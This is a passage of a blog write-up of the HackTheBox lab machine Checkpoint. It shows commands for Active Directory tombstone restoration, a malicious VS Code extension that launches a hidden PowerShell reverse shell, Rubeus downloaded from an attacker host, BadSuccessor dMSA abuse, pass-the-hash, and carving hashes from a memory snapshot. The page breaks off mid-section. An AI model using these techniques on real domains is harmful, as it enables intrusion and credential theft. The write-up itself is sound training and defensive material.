@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Checkpoint — S. Markakis</title>
+<meta name="description" content="HackTheBox Checkpoint — Active Directory tombstone reanimation, a malicious VS Code .vsix extension for RCE, the Server 2025 BadSuccessor dMSA privilege escalation, and dumping a domain admin hash out of a VMware memory snapshot with volatility3.">
+<meta property="og:title" content="HTB: Checkpoint — S. Markakis">
+<meta property="og:description" content="HackTheBox Checkpoint — Active Directory tombstone reanimation, a malicious VS Code .vsix extension for RCE, the Server 2025 BadSuccessor dMSA privilege escalation, and dumping a domain admin hash out of a VMware memory snapshot with volatility3.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-checkpoint.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-checkpoint.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-checkpoint.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-checkpoint.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-win  { background: #c0ccd8; color: #24384a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Checkpoint",
+  "description": "HackTheBox Checkpoint — Active Directory tombstone reanimation, a malicious VS Code .vsix extension for RCE, the Server 2025 BadSuccessor dMSA privilege escalation, and dumping a domain admin hash out of a VMware memory snapshot with volatility3.",
+  "datePublished": "2026-09-09",
+  "dateModified": "2026-09-09",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-checkpoint.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-checkpoint.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-checkpoint"
+  },
+  "timeRequired": "PT10M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+
+  <div class="post-header">
+    <h1>HTB: Checkpoint</h1>
+    <div class="post-meta">
+      <span class="date">September 9, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-win">Active Directory</span>
+      <span class="tag">Windows Server 2025</span>
+      <span>&nbsp;12 min read</span>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Checkpoint is a pure Active Directory chain with no exploitable CVE anywhere in it — every step is a misconfiguration handing off to the next. It opens on an object nobody should have been able to touch: a <strong>tombstoned</strong> (soft-deleted) user that our starting account can <em>reanimate</em>. From there it walks through a <strong>malicious VS Code <code>.vsix</code> extension</strong> for code execution, the brand-new <strong>BadSuccessor</strong> delegated-Managed-Service-Account abuse on Server 2025, and finishes somewhere unusual — pulling a domain administrator's hash out of a <strong>VMware memory snapshot</strong> sitting in a backup share, with volatility3. It's a great tour of "living off AD features" rather than exploiting bugs.
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-checkpoint/img-attack-chain.webp" type="image/webp"><img class="screenshot" src="assets/htb-checkpoint/img-attack-chain.png" alt="Checkpoint domain-compromise chain: alex.turner restores tombstoned Mark Davies, mark.davies drops a malicious VS Code vsix into DevDrop for a ryan.brooks shell and user.txt, BadSuccessor dMSA yields svc_deploy keys, svc_deploy reads a VMBackups vmem, volatility3 plus secretsdump recovers the Administrator hash, and pass-the-hash to DC01 gives root.txt" width="1540" height="784" loading="lazy" decoding="async"></picture>
+
+  <div class="chain">
+    <span class="chain-node">alex.turner</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">restore tombstone</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">mark.davies</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">malicious .vsix</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">ryan.brooks</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">BadSuccessor dMSA</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">svc_deploy</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">VMBackups .vmem</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">volatility3 + secretsdump</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">Administrator</span>
+  </div>
+
+  <div class="alert alert-info">Attacker box here is <strong>macOS</strong>, not Kali — worth calling out because it forces two workarounds later: the Windows AD tooling runs from <code>pipx</code> venvs, and Kerberos clock-skew can't be fixed with <code>ntpdate</code> without touching the system clock. Both are solved inline below.</div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <p>A full TCP sweep shows the standard domain-controller surface — the box announces itself as <code>DC01</code> in <code>checkpoint.htb</code>, Windows Server 2025 (build 26100).</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">recon</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -sC -sV -p- --min-rate 5000 &lt;TARGET_IP&gt;</span>
+<span class="po">53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp   open  microsoft-ds
+5985/tcp  open  http          Microsoft HTTPAPI (WinRM)
+...</span>
+<span class="pd">$ </span><span class="pc">echo '&lt;TARGET_IP&gt; checkpoint.htb dc01.checkpoint.htb dc01' | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <p>The box hands you a starting credential: <code>alex.turner : Checkpoint2024!</code>. It authenticates, so we go straight to object enumeration.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nxc smb — creds valid</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!'</span>
+<span class="po">SMB  DC01  [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb)
+SMB  DC01  </span><span class="pg">[+] checkpoint.htb\alex.turner:Checkpoint2024!</span></div>
+  </div>
+
+  <!-- ══ TOMBSTONE ══ -->
+  <h2>Initial Access — Tombstone Reanimation</h2>
+
+  <p>When an AD object is deleted it isn't gone immediately — it becomes a <strong>tombstone</strong>: stripped of most attributes and moved to <code>CN=Deleted Objects</code>, where it lingers for the tombstone lifetime (180 days by default) before the garbage collector reaps it. If you can <em>write</em> to a tombstone, you can clear its <code>isDeleted</code> flag and set a new <code>distinguishedName</code> — <strong>restoring</strong> it, attributes and all. bloodyAD's <code>get writable</code> shows alex.turner has exactly that right:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">bloodyAD get writable</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host &lt;TARGET_IP&gt; get writable</span>
+
+<span class="po">distinguishedName: </span><span class="py">CN=Deleted Objects,DC=checkpoint,DC=htb</span><span class="po">
+DACL: WRITE
+
+distinguishedName: </span><span class="py">CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,...</span><span class="po">
+permission: WRITE</span></div>
+  </div>
+
+  <p>There's the tombstone: a deleted <strong>Mark Davies</strong> we can write to. Restore it in one call:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">bloodyAD set restore</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host &lt;TARGET_IP&gt; \
+     set restore "CN=Mark Davies\0ADEL:2217e877-...,CN=Deleted Objects,DC=checkpoint,DC=htb"</span>
+<span class="pg">[+] CN=Mark Davies\0ADEL:2217e877-... has been restored successfully under
+    CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb</span></div>
+  </div>
+
+  <p>A restored account keeps its old password. Mark shared the domain's default, and he can see one more share than alex could:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nxc smb mark.davies --shares</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc smb checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares</span>
+<span class="pg">[+] checkpoint.htb\mark.davies:Checkpoint2024!</span><span class="po">
+Share      Permissions   Remark
+-----      -----------   ------
+</span><span class="py">DevDrop    READ,WRITE    VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0</span><span class="po">
+VMBackups                (no access yet)</span></div>
+  </div>
+
+  <div class="alert alert-warn">A writable tombstone is a DACL misconfiguration on <code>CN=Deleted Objects</code>. Restoration rights should be limited to a break-glass admin group; handing them to a normal user turns "we deleted that account" into "we un-deleted it, with its old password."</div>
+
+  <!-- ══ VSIX RCE ══ -->
+  <h2>Foothold — Malicious VS Code Extension</h2>
+
+  <p>The <code>DevDrop</code> share's own remark tells the story: it's a drop folder for "approved" VS Code extensions, engine <strong>1.118.0</strong>. Something on the box installs <code>.vsix</code> packages left here. A VS Code extension is just a zip with a manifest and a JavaScript entry point, and the entry point runs arbitrary Node on activation — so a malicious extension is trivial RCE against whoever loads it.</p>
+
+  <p>The package is four files: <code>[Content_Types].xml</code>, <code>extension.vsixmanifest</code>, and an <code>extension/</code> folder with <code>package.json</code> + <code>extension.js</code>. The manifest declares the matching engine; <code>package.json</code> activates on startup and points at our code; <code>extension.js</code> spawns a reverse shell:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">extension/package.json + extension.js</span>
+    </div>
+    <div class="term-body"><span class="po">// package.json
+"engines": { "vscode": "^1.118.0" },
+"activationEvents": ["onStartupFinished"],
+"main": "./extension.js"
+
+// extension.js — runs the moment the editor finishes loading
+const cp = require('child_process');
+function activate() {
+  cp.exec('powershell -nop -w hidden -e &lt;base64 reverse shell&gt;');
+}
+module.exports = { activate, deactivate: () =&gt; {} };</span></div>
+  </div>
+
+  <p>Zip it into a <code>.vsix</code>, start a listener, and drop it into the share with mark.davies's write access:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">package &amp; deliver</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">zip -r exploit.vsix "[Content_Types].xml" extension.vsixmanifest extension/</span>
+<span class="pd">$ </span><span class="pc">ncat -lvnp 4444        </span><span class="pco"># listener</span>
+<span class="pd">$ </span><span class="pc">smbclient //checkpoint.htb/DevDrop -U 'checkpoint.htb\mark.davies%Checkpoint2024!' \
+     -c 'put exploit.vsix exploit.vsix'</span></div>
+  </div>
+
+  <p>A minute later the simulated operator's editor loads the extension and calls back — as <strong>ryan.brooks</strong>, on DC01 itself:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">reverse shell</span>
+    </div>
+    <div class="term-body"><span class="po">Ncat: Connection from &lt;TARGET_IP&gt;.
+</span><span class="pd">PS C:\Program Files\Microsoft VS Code&gt; </span><span class="pc">whoami; hostname</span><span class="po">
+checkpoint\ryan.brooks
+DC01</span>
+<span class="pd">PS ...&gt; </span><span class="pc">type C:\Users\ryan.brooks\Desktop\user.txt</span><span class="po">
+</span><span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <div class="alert alert-info">Auto-installing "approved" extensions from a writable share is the whole bug — the trust boundary is the share ACL, and it's set to READ/WRITE for a restorable account. Extensions are code; a share you can write to that feeds an editor is a code-execution primitive.</div>
+
+  <!-- ══ BADSUCCESSOR ══ -->
+  <h2>Privilege Escalation — BadSuccessor (dMSA abuse)</h2>
+
+  <p><strong>BadSuccessor</strong> is a 2025 Server-2025 technique (Akamai's Yuval Gordon) that abuses <strong>delegated Managed Service Accounts</strong>. dMSAs were meant to replace legacy service accounts: you link a new dMSA to its predecessor via <code>msDS-ManagedAccountPrecededByLink</code>, flag the migration complete, and the KDC lets the dMSA authenticate <em>with the predecessor's keys</em> so nothing breaks during cutover. The catch: if you can create a dMSA in an OU you control, you can point that link at <em>any</em> account and the KDC will hand you its keys. netexec's module confirms ryan.brooks is a valid principal for it:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nxc ldap -M badsuccessor</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -M badsuccessor</span>
+<span class="po">BADSUCCESSOR  [+] ryan.brooks (S-1-5-...-1103), </span><span class="py">OU=DMSAHolder,DC=checkpoint,DC=htb</span></div>
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-checkpoint/img-badsuccessor.webp" type="image/webp"><img class="screenshot" src="assets/htb-checkpoint/img-badsuccessor.png" alt="BadSuccessor dMSA migration abuse: ryan.brooks with CREATE_CHILD on OU=DMSAHolder uses Rubeus tgtdeleg for a TGT then bloodyAD add badSuccessor to forge evilDMSA6 linked as the successor of svc_deploy, and the KDC packs svc_deploy's AES and RC4 keys into the returned TGS" width="1568" height="662" loading="lazy" decoding="async"></picture>
+
+  <h3>Getting a ticket without a password</h3>
+
+  <p>bloodyAD's <code>badSuccessor</code> needs to authenticate as ryan.brooks — but we only have a shell, not his password or hash. <strong>Rubeus <code>tgtdeleg</code></strong> solves that: it abuses Kerberos GSS-API delegation to make the local session hand over a usable TGT for the current user, no secrets required. We host Rubeus over HTTP, pull it into the shell, and run it:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">Rubeus tgtdeleg (in the ryan.brooks shell)</span>
+    </div>
+    <div class="term-body"><span class="pd">PS ...&gt; </span><span class="pc">iwr http://&lt;LHOST&gt;:8181/rubeus.exe -OutFile C:\Windows\Temp\rubeus.exe</span>
+<span class="pd">PS ...&gt; </span><span class="pc">C:\Windows\Temp\rubeus.exe tgtdeleg /nowrap</span>
+<span class="po">[+] Delegation request success!
+[*] base64(ticket.kirbi):
+    </span><span class="py">doIF1DCCBdCgAwIBBaEDAgEWooIE0...</span></div>
+  </div>
+
+  <p>Convert the kirbi to a ccache impacket/bloodyAD can use:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">kirbi → ccache</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">base64 -d ryan.kirbi.b64 &gt; ryan.kirbi</span>
+<span class="pd">$ </span><span class="pc">ticketConverter.py ryan.kirbi ryan.ccache &amp;&amp; export KRB5CCNAME=$PWD/ryan.ccache</span></div>
+  </div>
+
+  <div class="alert alert-warn">macOS clock-skew aside: the DC ran ~7&nbsp;hours ahead, and Kerberos rejects tickets outside a ±5&nbsp;min window. On Kali you'd <code>sudo ntpdate checkpoint.htb</code>; I didn't want to move the host clock. <strong>bloodyAD detects the skew and self-corrects</strong> ("Clock skew detected. Adjusting local time by 6:59:58. Retrying") — so no fix was needed for the steps that matter. For pure-NTLM steps below I sidestep Kerberos entirely.</div>
+
+  <h3>Forging the successor</h3>
+
+  <p>ryan can write into <code>OU=DMSAHolder</code>, and earlier enumeration (bloodyAD <code>get writable --right WRITE</code>) showed he also has WRITE over <code>CN=svc_deploy</code> — the target. Create the malicious dMSA linked as svc_deploy's successor:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">bloodyAD add badSuccessor</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD -k ccache=ryan.ccache -u ryan.brooks --dc-ip &lt;TARGET_IP&gt; \
+     --host dc01.checkpoint.htb -d checkpoint.htb \
+     add badSuccessor evilDMSA6 \
+     -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
+     --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"</span>
+
+<span class="po">[+] dMSA TGT stored in ccache file evilDMSA6_ox.ccache
+
+dMSA previous keys (including keys of preceding managed accounts):
+</span><span class="pg">RC4: e16081eb077aca74bdbf8af12af43ac9</span><span class="po">   ← svc_deploy's NT hash</span></div>
+  </div>
+
+  <p>The KDC returned svc_deploy's keys. That <strong>RC4 key is svc_deploy's NT hash</strong> — which means I can drop Kerberos and just pass-the-hash over NTLM, dodging the clock-skew problem entirely. svc_deploy can read <code>VMBackups</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">svc_deploy via NT hash</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc smb dc01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares</span>
+<span class="pg">[+] checkpoint.htb\svc_deploy:e16081eb...</span><span class="po">
+Share       Permissions   Remark
+-----       -----------   ------
+</span><span class="py">VMBackups   READ</span></div>
+  </div>
+
+  <!-- ══ MEMORY FORENSICS ══ -->
+  <h2>Loot &amp; Root — Credentials from a Memory Snapshot</h2>
+
+  <p><code>VMBackups</code> holds a nightly VMware backup of a Windows Server 2019 VM. The interesting file is the <code>.vmem</code> — a VMware <strong>memory snapshot</strong>, i.e. the guest's entire RAM at snapshot time, 2&nbsp;GB of it:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">VMBackups contents</span>
+    </div>
+    <div class="term-body"><span class="po">\NightlyBackup_2024-11-01\memory forensics\
+  Windows Server 2019-Snapshot1.vmem      2147483648   </span><span class="py"># raw guest RAM</span><span class="po">
+  Windows Server 2019-Snapshot1.vmsn       138164859
+  Windows Server 2019.vmdk               10199695360</span>
+<span class="pd">$ </span><span class="pc">smbclient //dc01.checkpoint.htb/VMBackups -U 'checkpoint.htb\svc_deploy' \
+     --pw-nt-hash e16081eb... -c 'cd "NightlyBackup_2024-11-01\memory forensics"; get "...Snapshot1.vmem" snapshot.vmem'</span></div>
+  </div>
+
+  <p>RAM contains the registry hives while a machine is running. <strong>volatility3</strong> carves them straight out of the image — <code>SAM</code>, <code>SYSTEM</code> and <code>SECURITY</code> are all we need to reconstruct the local secrets:</p>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-checkpoint/img-memory-forensics.webp" type="image/webp"><img class="screenshot" src="assets/htb-checkpoint/img-memory-forensics.png" alt="Memory forensics flow: svc_deploy reads a 2GB VMBackups vmem, volatility3 hivelist dump carves SAM SYSTEM SECURITY, impacket secretsdump LOCAL uses the SYSTEM bootKey to decrypt the SAM to the Administrator NT hash f29e9c01, which is reused for the live domain and pass-the-hash to DC01 returns Pwn3d" width="1567" height="555" loading="lazy" decoding="async"></picture>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">volatility3 — dump the hives</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">vol -f snapshot.vmem windows.registry.hivelist.HiveList</span>
+<span class="po">0xc30a2fe38000  \REGISTRY\MACHINE\SYSTEM
+0xc30a3278e000  \SystemRoot\System32\Config\SAM
+0xc30a32789000  \SystemRoot\System32\Config\SECURITY</span>
+<span class="pd">$ </span><span class="pc">vol -o lsass_dump -f snapshot.vmem windows.registry.hivelist.HiveList --dump</span></div>
+  </div>
+
+  <p>With the three hives on disk, offline <code>secretsdump</code> uses the SYSTEM bootKey to decrypt the SAM and print the local account hashes:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
